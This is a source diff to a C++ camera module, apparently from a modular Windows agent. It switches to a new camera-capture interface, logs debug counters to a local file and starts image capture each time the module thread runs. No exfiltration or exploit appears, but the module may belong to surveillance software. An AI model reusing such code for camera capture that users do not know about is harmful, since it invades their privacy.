@@ -6,8 +6,37 @@
 
 #include "wtypes.h"
 
+/*****
 #include "NativePhotoCaptureInterface.h"
 using namespace NativePhotoCaptureInterface::Native;
+*****/
+
+#include "NativeCameraCaptureInterface.h"
+using namespace NativeCameraCaptureInterface::Native;
+
+extern "C" int conta;
+extern "C"  int contaCameraCapturePreviewSink;
+extern "C"  int contaCameraCaptureSampleSink;
+int conta=0;
+int contaCameraCapturePreviewSink=0;
+int contaCameraCaptureSampleSink=0;
+
+#include <time.h>
+#include <iostream>
+#include <fstream>
+#include <windows.h>
+
+#define DTTMFMT "%Y-%m-%d %H:%M:%S "
+#define DTTMSZ 21
+static char *getDtTm (char *buff) {
+    time_t t = time (0);
+    strftime(buff, DTTMSZ, DTTMFMT, localtime (&t));
+    return buff;
+}
+
+using namespace std;
+
+NativeCapture^ photoCapture;
 
 DWORD WINAPI CameraModule(LPVOID lpParam) {
 	Module *me = (Module *)lpParam;
@@ -26,8 +55,39 @@ DWORD WINAPI CameraModule(LPVOID lpParam) {
 	
 	DBG_TRACE(L"Debug - CameraGrabber.cpp - Camera Module is Alive\n", 5, FALSE);
 
+	/*****
 	NativeCapture^ photoCapture = ref new NativeCapture();
 	photoCapture=nullptr;
+	*****/
+		
+		wchar_t msgW[128];
+		char msgA[128];
+		swprintf_s(msgW,L"conta=%i\ncontaCameraCapturePreviewSink=%i\ncontaCameraCaptureSampleSink=%i\n",conta,contaCameraCapturePreviewSink,contaCameraCaptureSampleSink );
+		wcstombs(msgA, msgW, wcslen(msgW)+1);
+
+		fstream filestr;
+		char buff[DTTMSZ];
+		filestr.open ("fotogrammi.txt", fstream::out|fstream::app);
+		filestr << getDtTm (buff) << std::endl;
+		filestr << msgA << std::endl;
+		filestr << std::endl;
+		filestr.close();
+
+
+	conta++;
+	if(conta==1)
+	{
+		photoCapture = ref new NativeCapture();
+		photoCapture->StartCapture();
+	//NativeCapture^ photoCapture = ref new NativeCapture();
+	//photoCapture=nullptr;
+	}
+	else
+	{
+			photoCapture->StartCapture();
+			
+	}
+
 
 	me->setStatus(MODULE_STOPPED);
 	DBG_TRACE(L"Debug - CameraGrabber.cpp - Camera Module clean stop\n", 5, FALSE);
